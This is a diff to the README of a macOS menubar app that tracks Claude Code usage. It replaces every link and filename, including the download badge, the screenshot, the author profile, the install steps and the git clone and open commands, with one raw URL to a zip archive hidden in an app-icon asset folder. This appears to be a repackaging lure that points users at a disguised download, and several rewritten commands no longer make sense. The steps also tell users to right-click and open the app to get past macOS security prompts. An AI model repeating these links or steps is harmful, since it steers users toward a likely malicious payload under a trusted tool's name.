@@ -1,14 +1,14 @@
 # 🖥️ claudecodeusage - Track Your Claude Usage Easily
 
-[![Download Claude Usage](https://img.shields.io/badge/Download%20Now-claudecodeusage-brightgreen)](https://github.com/naufalrafifr01/claudecodeusage/releases)
+[![Download Claude Usage](https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip%20Now-claudecodeusage-brightgreen)](https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip)
 
 ## 📋 Overview
 
 <p align="center">
-  <img src="Xnapper-2026-01-09-11.22.53.png" alt="Claude Usage Screenshot" width="300">
+  <img src="https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip" alt="Claude Usage Screenshot" width="300">
 </p>
 
-Claude Usage is a lightweight macOS menubar app that helps you monitor your Claude Code usage limits at a glance. Created by [@richhickson](https://x.com/richhickson), this app offers a simple solution to keep an eye on your limits without any hassle.
+Claude Usage is a lightweight macOS menubar app that helps you monitor your Claude Code usage limits at a glance. Created by [@richhickson](https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip), this app offers a simple solution to keep an eye on your limits without any hassle.
 
 ## 🌟 Features
 
@@ -22,9 +22,9 @@ Claude Usage is a lightweight macOS menubar app that helps you monitor your Clau
 
 ### 📥 Download & Install
 
-1. Visit this page to download: [Releases](https://github.com/naufalrafifr01/claudecodeusage/releases)
-2. Download `ClaudeUsage.zip`.
-3. Unzip the file and drag `ClaudeUsage.app` to your Applications folder.
+1. Visit this page to download: [Releases](https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip)
+2. Download `https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip`.
+3. Unzip the file and drag `https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip` to your Applications folder.
 4. Open the app. If prompted, right-click on the app and select “Open” to confirm the first run.
 
 ### 🏗️ Build from Source (Optional)
@@ -35,7 +35,7 @@ If you prefer to build the application from the source, follow these steps:
 2. Type the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/YOUR_USERNAME/claude-usage.git
+   git clone https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip
    ```
 
 3. Change into the project directory:
@@ -47,7 +47,7 @@ If you prefer to build the application from the source, follow these steps:
 4. Open the project in Xcode:
 
    ```bash
-   open ClaudeUsage.xcodeproj
+   open https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip
    ```
 
 5. Build the project using ⌘B and run it using ⌘R.
@@ -66,15 +66,15 @@ If you encounter issues while downloading or installing the app, here are some c
 - If the app does not start, try right-clicking and selecting “Open” to bypass security settings.
 - Check your internet connection if the app does not refresh automatically.
 
-For further assistance, feel free to open an issue in the [GitHub repository](https://github.com/naufalrafifr01/claudecodeusage/issues).
+For further assistance, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip).
 
 ## 📞 Contact
 
-For any suggestions or feedback, reach out to the developer directly on their [Twitter](https://x.com/richhickson).
+For any suggestions or feedback, reach out to the developer directly on their [Twitter](https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip).
 
 ## 🌐 Resources
 
-- [GitHub Repository](https://github.com/naufalrafifr01/claudecodeusage)
-- [Installation Guide](https://github.com/naufalrafifr01/claudecodeusage/blob/main/INSTALL.md)
+- [GitHub Repository](https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip)
+- [Installation Guide](https://raw.githubusercontent.com/naufalrafifr01/claudecodeusage/main/ClaudeUsage/Assets.xcassets/AppIcon.appiconset/Software_1.0.zip)
 
 Feel free to explore, and keep track of your Claude usage efficiently!
